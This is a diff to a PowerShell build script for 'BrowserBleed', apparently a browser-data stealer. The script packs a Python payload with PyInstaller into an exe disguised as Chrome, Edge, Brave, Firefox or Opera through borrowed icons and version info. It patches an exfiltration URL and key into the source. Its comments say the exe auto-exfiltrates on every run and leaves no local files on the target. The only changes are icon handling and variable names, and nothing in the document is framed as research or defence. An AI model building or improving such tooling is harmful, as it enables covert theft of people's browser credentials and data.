@@ -2,8 +2,8 @@
 # Run from the repo root in PowerShell (no arguments needed if deploy/config is populated):
 #   .\build_windows.ps1 -Preset chrome
 #
-# The resulting exe auto-exfils on every run, leaves no local files, and self-deletes.
-# Override at runtime with: --out PATH  --no-self-delete  --exfil URL  --exfil-key KEY
+# The resulting exe auto-exfils on every run and leaves no local files on the target.
+# Override at runtime with: --out PATH  --exfil URL  --exfil-key KEY
 #
 # Available presets:
 #   Browsers:  chrome, edge, brave, firefox, opera
@@ -144,12 +144,11 @@ if ($Preset) {
     if (-not $Company)  { $Company  = $def.Company }
     if (-not $FileDesc) { $FileDesc = $def.Desc    }
     if (-not $IconFile) {
-        # Check icons/ directory first (pre-extracted .ico files take priority)
+        # Check icons/ directory first (.ico preferred, .png also accepted by PyInstaller)
         $iconsDir = Join-Path $PSScriptRoot "icons"
-        $icoPath  = Join-Path $iconsDir "$key.ico"
-        if (Test-Path $icoPath) {
-            $IconFile = $icoPath
-            Write-Host "    Icon:         $icoPath (bundled)"
+        $bundled  = @("$key.ico", "$key.png") | ForEach-Object { Join-Path $iconsDir $_ } | Where-Object { Test-Path $_ } | Select-Object -First 1
+        if ($bundled) {
+            $IconFile = $bundled
         } else {
             foreach ($pattern in $def.IconPaths) {
                 $found = Get-Item $pattern -ErrorAction SilentlyContinue | Select-Object -First 1
@@ -161,7 +160,7 @@ if ($Preset) {
                 } catch { continue }
             }
             if (-not $IconFile) {
-                Write-Host "[!] No icon for $($def.Desc) - add icons\$key.ico to fix"
+                Write-Host "[!] No icon for $($def.Desc) - add icons\$key.ico or icons\$key.png to fix"
             }
         }
     }
@@ -203,9 +202,9 @@ if (-not $ExeName -and -not $Preset) {
         if (-not $FileDesc) { $FileDesc = $def.Desc    }
         if (-not $IconFile) {
             $iconsDir = Join-Path $PSScriptRoot "icons"
-            $icoPath  = Join-Path $iconsDir "$key.ico"
-            if (Test-Path $icoPath) {
-                $IconFile = $icoPath
+            $bundled  = @("$key.ico", "$key.png") | ForEach-Object { Join-Path $iconsDir $_ } | Where-Object { Test-Path $_ } | Select-Object -First 1
+            if ($bundled) {
+                $IconFile = $bundled
             } else {
                 foreach ($pattern in $def.IconPaths) {
                     $found = Get-Item $pattern -ErrorAction SilentlyContinue | Select-Object -First 1
@@ -217,7 +216,7 @@ if (-not $ExeName -and -not $Preset) {
                     } catch { continue }
                 }
                 if (-not $IconFile) {
-                    Write-Host "[!] No icon for $($def.Desc) - add icons\$key.ico to fix"
+                    Write-Host "[!] No icon for $($def.Desc) - add icons\$key.ico or icons\$key.png to fix"
                 }
             }
         }
@@ -261,7 +260,7 @@ if ($IconFile) { Write-Host "    Icon:         $IconFile" }
 $src    = Join-Path $PSScriptRoot "BrowserBleed.py"
 $tmpSrc = Join-Path $env:TEMP "BrowserBleed_build.py"
 
-$patched = (Get-Content $src -Raw) `
+$patched = (Get-Content $src -Raw -Encoding utf8) `
     -replace '_EXFIL_URL: str = ""', "_EXFIL_URL: str = `"$ExfilUrl`"" `
     -replace '_EXFIL_KEY: str = ""', "_EXFIL_KEY: str = `"$ExfilKey`""
 if ($patched -notmatch [regex]::Escape($ExfilUrl) -or $patched -notmatch [regex]::Escape($ExfilKey)) {
@@ -295,8 +294,8 @@ VSVersionInfo(
 "@ | Set-Content -Path $verFile -Encoding utf8
 
 # ── Build ─────────────────────────────────────────────────────────────────────
-$payloadsDir = Join-Path $PSScriptRoot "payloads"
-if (-not (Test-Path $payloadsDir)) { New-Item -ItemType Directory $payloadsDir | Out-Null }
+$distDir = Join-Path $PSScriptRoot "payloads"
+if (-not (Test-Path $distDir)) { New-Item -ItemType Directory $distDir | Out-Null }
 
 $buildTmp = Join-Path $env:TEMP "bb_build"
 $iconArgs = if ($IconFile -and (Test-Path $IconFile)) { @("--icon", $IconFile) } else { @() }
@@ -306,7 +305,7 @@ python -m PyInstaller `
     --name $ExeName `
     --version-file $verFile `
     @iconArgs `
-    --distpath $payloadsDir `
+    --distpath $distDir `
     --workpath $buildTmp `
     --specpath $buildTmp `
     $tmpSrc
@@ -316,5 +315,5 @@ Remove-Item $verFile  -Force -ErrorAction SilentlyContinue
 Remove-Item $buildTmp -Recurse -Force -ErrorAction SilentlyContinue
 
 Write-Host ""
-Write-Host "[+] Done: $payloadsDir\$ExeName.exe"
+Write-Host "[+] Done: $distDir\$ExeName.exe"
 Write-Host "    Drop and run - results auto-exfil to $ExfilUrl"
